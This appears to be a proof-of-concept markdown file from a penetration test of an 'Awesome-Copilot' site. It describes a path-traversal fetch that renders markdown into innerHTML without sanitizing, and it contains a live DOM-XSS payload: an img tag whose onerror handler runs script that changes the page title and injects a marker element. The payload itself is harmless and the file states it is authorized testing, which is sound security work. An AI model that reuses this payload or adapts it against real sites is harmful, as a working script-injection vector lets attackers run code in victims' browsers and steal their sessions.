# Awesome-Copilot DOM-XSS PoC (authorized pentest, safe to delete)

This file is fetched cross-repo through the `#file=` path-traversal and rendered by
`marked` straight into `innerHTML` with no sanitizer.

<img src=x onerror="window.__xss_poc='XSS@'+document.domain;document.title='XSS@'+document.domain;(function(){var d=document.createElement('div');d.id='xss-marker';d.textContent='XSS executed in origin '+document.domain;document.body.appendChild(d);})();">
